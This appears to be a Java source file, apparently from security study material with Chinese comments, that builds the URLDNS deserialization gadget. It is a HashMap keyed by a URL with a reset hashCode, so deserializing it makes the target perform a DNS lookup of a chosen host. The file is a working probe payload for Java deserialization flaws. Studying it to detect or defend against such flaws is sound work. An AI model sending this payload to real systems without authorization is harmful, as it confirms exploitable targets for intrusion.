package org.example.payload;

import java.io.IOException;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

public class URLDNS {
    public Object getObject(final String url) throws Exception {

        // SilentURLStreamHandler是我们继承URLStreamHandler实现的一个类,这里没有什么实际意义,只是为了满足new URL类时的参数要求
        URLStreamHandler handler = new SilentURLStreamHandler();

        // HashMap的readObject是触发漏洞的直接原因
        HashMap ht = new HashMap();
        URL u = new URL(null, url, handler);
        ht.put(u, url);

        setFieldValue(u, "hashCode", -1);
        return ht;
    }

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
